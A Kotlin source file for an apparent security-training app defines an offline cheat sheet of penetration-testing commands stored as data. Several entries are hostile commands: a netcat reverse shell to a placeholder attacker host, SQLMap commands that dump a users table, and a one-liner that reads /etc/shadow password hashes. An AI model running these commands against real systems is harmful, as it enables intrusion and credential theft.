package com.example.ui.sheets

/**
 * The offline command reference.
 *
 * Extracted from a `remember { listOf(...) }` block that lived inside the
 * composable: the list was rebuilt on every recomposition of the tab, and it
 * mixed the data with the UI. It is now a top-level `val` so the list is
 * allocated once, and the category set is derived from the data rather than
 * hand-maintained in a second list that could drift out of sync.
 */
data class CheatCommand(
  val category: String,
  val title: String,
  val command: String
)

object CheatSheetCatalog {

  val commands: List<CheatCommand> = listOf(
    CheatCommand("Nmap", "Aggressive Port Scan", "nmap -A -T4 target_ip"),
    CheatCommand("Nmap", "Full TCP Port Scan", "nmap -p- -sV target_ip"),
    CheatCommand("Nmap", "Version + Script Scan", "nmap -sC -sV -Pn target_ip"),
    CheatCommand("Nmap", "UDP Top 20 Ports", "nmap -sU --top-ports 20 target_ip"),
    CheatCommand("Nmap", "List Target Hosts", "nmap -sn 10.10.14.0/24"),

    CheatCommand("Metasploit", "Search Exploit Modules", "search type:exploit platform:linux"),
    CheatCommand("Metasploit", "Configure Target Host", "set RHOSTS target_ip"),
    CheatCommand("Metasploit", "Show Session Info", "sessions -l"),
    CheatCommand("Metasploit", "Background Current Session", "sessions -b <id>"),

    CheatCommand("Wireshark", "Filter HTTP Traffic", "http.request or http.response"),
    CheatCommand("Wireshark", "Detect TCP Retransmits", "tcp.analysis.retransmission"),
    CheatCommand("Wireshark", "Follow A TCP Stream", "tcp.stream eq 0"),
    CheatCommand("Wireshark", "Extract Object (HTTP)", "http.file_data"),

    CheatCommand("SQLMap", "Test a GET Parameter", "sqlmap -u 'https://target/?id=1' --dbs"),
    CheatCommand("SQLMap", "Enumerate Database Tables", "sqlmap -u TARGET --tables --batch"),
    CheatCommand("SQLMap", "Dump a Table", "sqlmap -u TARGET -D db -T users --dump"),

    CheatCommand("Netcat", "Reverse Shell (Linux)", "nc -e /bin/sh LHOST LPORT"),
    CheatCommand("Netcat", "Listener", "nc -lvp LPORT"),
    CheatCommand("Netcat", "Grab Service Banner", "nc -w 3 target_ip 22"),

    CheatCommand("Privilege Escalation", "Check SUID Binaries", "find / -perm -4000 -type f 2>/dev/null"),
    CheatCommand("Privilege Escalation", "Kernel & Release", "uname -a && cat /etc/os-release"),
    CheatCommand("Privilege Escalation", "Writable /etc/passwd", "ls -l /etc/passwd"),

    CheatCommand("Post-Exploitation", "List Listening Sockets", "ss -tulpn"),
    CheatCommand("Post-Exploitation", "Dump Hashes (Linux)", "cat /etc/shadow | tr ':' ' ' | xargs -n1 echo"),
    CheatCommand("Post-Exploitation", "Enumerate SUID Capabilities", "getcap -r / 2>/dev/null"),
    CheatCommand("Post-Exploitation", "Review Cron Jobs", "cat /etc/cron* 2>/dev/null")
  )

  /**
   * Sentinel for "no category filter". Stored in the ViewModel and compared by
   * value, so it is a stable constant rather than a bare `"All"` literal.
   */
  const val ALL_CATEGORY = "All"

  /** Categories in first-appearance order, with [ALL_CATEGORY] prepended. */
  val categories: List<String> =
    listOf(ALL_CATEGORY) + commands.map { it.category }.distinct()
}
